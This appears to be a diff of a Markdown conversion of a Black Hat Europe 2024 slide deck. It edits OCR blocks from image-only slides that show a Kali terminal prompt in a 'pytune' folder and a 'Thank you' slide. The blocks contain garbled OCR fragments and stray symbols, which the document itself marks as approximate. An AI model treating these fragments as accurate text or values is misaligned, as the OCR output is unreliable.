-|
 Archive Edit View Help
 | | & Open ¥ bo Extract es
 Location:
@@ -1772,15 +1647,11 @@ Chrome OS
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pis hat x —
-EUROPE 2024
 kali - VMware Workstation
-TP4IUE wE(E)
-[fp wintodev kali
-EBM Kali@kali: ~/Desktopworkypytune
 File Actions Edit View Help
 C:\home\kali\Desktop\work\pytune> ff
 5:14 AM
@@ -1808,31 +1679,11 @@ C:\home\kali\Desktop\work\pytune> ff
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-WA\
-{ CO
-EUROPE 20 Cen
--_
-Y @TEMP43487580
-@f2#th--h =-2601a596
-```
-
 ## Slide 88
 
 # Thank you
 
 #BHEU @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Middx Dural! Vj.
-a 20
-=3 — Thank ‘W, -
-IC
-```
 
 ## Slide 89
 
